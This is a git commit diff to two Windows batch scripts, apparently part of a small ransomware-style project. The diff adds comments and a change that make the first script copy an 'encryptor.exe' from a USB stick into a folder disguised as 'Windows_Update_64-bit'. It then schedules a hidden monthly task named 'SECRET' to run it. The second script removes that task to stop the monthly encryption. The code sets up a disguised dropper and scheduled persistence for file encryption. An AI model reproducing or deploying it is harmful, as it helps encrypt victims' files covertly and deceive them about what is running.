9fe90d6551b497fa30b12be4bb461bc5d182e06a
jackDevz <jackt.rodriguez1999@gmail.com>
2022-09-28 09:08:55 +0100

    Task Comments

--- TaskCreation.bat
+++ TaskCreation.bat
@@ -1,5 +1,9 @@
 @echo off
+
+Rem This script makes a deceptive folder in the user's documents, copies all of the required files from the USB stick to that folder and then creates a task
+Rem The task will run on the 30th of the month, and will execute the Task.bat file.
+
 mkdir C:\Users\%USERNAME%\Documents\Windows_Update_64-bit
 xcopy /s "encryptor.exe" "C:\Users\%USERNAME%\Documents\Windows_Update_64-bit"
 xcopy /s "TaskRemoval.bat" "C:\Users\%USERNAME%\Documents\Windows_Update_64-bit"
-SCHTASKS /CREATE /SC MONTHLY /D 30 /TN "WINDOWSTASKS\SECRET" /TR "C:\Windows\System32\notepad.exe" /ST 12:00
+SCHTASKS /CREATE /SC MONTHLY /D 30 /TN "WINDOWSTASKS\SECRET" /TR "C:\Users\%USERNAME%\Documents\Windows_Update_64-bit\Task.bat" /ST 12:00
--- TaskRemoval.bat
+++ TaskRemoval.bat
@@ -1,1 +1,4 @@
+@echo off
+
+Rem This script removes the task from the task scheduler to prevent it continuously encrypting every month.
 SCHTASKS /DELETE /TN "WINDOWSTASKS\SECRET" /f
